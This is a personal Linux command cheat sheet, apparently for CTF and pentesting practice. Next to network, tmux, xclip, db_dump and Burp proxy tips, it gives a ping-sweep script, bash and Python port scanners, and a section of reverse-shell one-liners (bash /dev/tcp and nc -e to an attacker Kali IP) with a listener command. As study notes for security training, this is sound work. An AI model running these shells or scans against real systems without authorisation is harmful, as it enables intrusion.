# Useful commands and tools on Linux

## Network commands

- `ifconfig`
- `ip a`
- `iwconfig` wireless connection
- `arp -a`
- `ip n`
- `ip r` 
- `route` get the routing table
- `ping IP-ADD-OR-HOST` check if a host is up
- `netstat` 

### Pingsweep in bash

- On his course Practical Ethical Hacking Heath Adams shares this script that is really convenient to make an ip sweep.
```bash
#!/bin/bash
if [ "$1" == "" ]
then
echo "You forgot an IP address!"
echo "Syntax: ./ipsweep.sh 192.168.1"

else
for ip in `seq 1 254`; do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done
fi
```
- To automate this further we could add an nmap script to run on the alive ip found.
- Here is an internal port Scanner (credits to Tryhackme - Holo network)
```bash
#!/bin/bash
ports=(21 22 53 80 443 3306 8443 8080)
for port in ${ports[@]}; do
timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null" 
done
```
- Python port scan (credits to Tryhackme - Holo network)
```python
#!/usr/bin/python3
import socket
host = "1.1.1.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
  s.connect((host,port))
  print("Port ", port, " is open")
 except:
  print("Port ", port, " is closed")
```

## read .db file

- `apt-get install db-util` install db-util
- Show everything that’s in the file database.db `db_dump -p database.db`
- List the databases in the file database.db `db_dump -l database.db`
- Show only the content of the database mydb in the file database.db `db_dump -p -s mydb database.db`

## xclip

### Install

- `sudo apt install xclip`

### Use

xclip is a tool that can allow you to get any output in you clipboard.  
Let's say you have a big input to copy and do not want to mess up with the mouse, you can use xclip.
- `cat myverybigfile | xclip -sel clipboard` will send the content of myverybigfile to the clipboard

## Strings

Strings will print human readable chars of a file. And for a CTF if we are looking for a specific string we can pipe it to grep
- `strings -e l file | grep -i FLAG` the `-e l` will select the encoding l is for 16-bit littleendian
- `strings file` is the basic use of the command

## TMUX

"tmux is a terminal multiplexer. It lets you switch easily between several programs in one terminal, detach them (they keep running in the background) and reattach them to a different terminal." Learn more about [tmux](https://github.com/tmux/tmux/wiki).

- `tmux new -s sessionName` create an join a new session
- `ctrl+b d` detach a session
- `tmux ls` list existing sessions
- `ctrl+b x` kill current session
- `tmux a -t sessionName` or `tmux a -t sessionId` join an existing session
- `tmux  ctrl+b pageup` to scroll and `q` to leave scroll mode

## Which architecture

- `lscpu` will tell you if you are 32 or 64
- `uname -m` similar but less verbose

## Useful shortcuts to use the terminal quickly

- `Ctrl+U` - clear all the current line from the end to the beginning only if the cursor is at the end of the line.
- `Ctrl+Y` - recall the cleared line 
- `Ctrl+K` - clear all the current line from the beginning to the end only if the cursor is at the beginning of the line.
- `Ctrl+W` - clear the previous word in the current line. For example if you have typed a command like `git diff /path/to/some/file` and you want to delete just the last parameter to the command, Ctrl+W is very useful.
- `Ctrl+E Ctrl+U` - move the cursor to the end of the line and clear all the current line from the end to the beginning.
- `Ctrl+A Ctrl+K` - move the cursor at the beginning of the line and clear all the current line from the beginning to the end.
- `Ctrl+C` - cancel the current command line, which implies clear all the current line no matter where the cursor is. (you can't recall the cleared line anymore).
- `Alt+Shift+#` - comment the current line, keep it in the history and bring up your prompt on a new line.
- `Ctrl+Shit+C` - copy something you previously selected
- `Ctrl+Shit+V` - paste something
- `Home` - Go to the begining of your prompt 
- `End` - Go to the end of your prompt

## Launch shells from a terminal

- Say we have a way through root and we need to get a reverse shell here are helpfuls command
  - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
  - `nc IP-OF-YOUR-KALI 4444 –e /bin/bash`
  - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
- *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*

## Permissions cheat sheet

![image](https://user-images.githubusercontent.com/96747355/175057144-3baa417c-db0b-4709-af0d-eb370d222c39.png)  
Source: [Chmod tutorial by Ryan Morrison](https://medium.com/@razl/chmod-tutorial-ce4386a3ce0c)

## Explainshell.com

- [This website](https://explainshell.com/) is relly helpful to understand what a specific linux command does. Here is an example with `rm -rf file`  
![image](https://user-images.githubusercontent.com/96747355/175054655-9a49193f-38a3-4cc7-92dc-e1d6f716aaab.png)

## Route your scripts through burp

- `export https_proxy=http://server-ip:port/` for example `export https_proxy=http://127.0.0.1:8080/`
- You will need to add a cert
 - Generate a burp.der cert
 - Convert it to pem `openssl x509 -inform der -in burp.der -out burp.pem`
 - Install Burp certificate:  
   - `cp burp.pem /etc/ssl/certs/` (will need sudo if not root)
   - `update-ca-certificates` (will need sudo if not root)
   - `cp burp.pem burp.crt`
   - `sudo cp burp.crt /usr/local/share/ca-certificates/`
   - `sudo cp burp.crt /usr/share/ca-certificates/`
- Everytime you launch a script you should see the traffic in burp

## Resources

{% embed url="https://askubuntu.com/questions/470966/shortcut-to-clear-command-line-terminal" %} Shortcut to clear command line terminal {% endembed %}
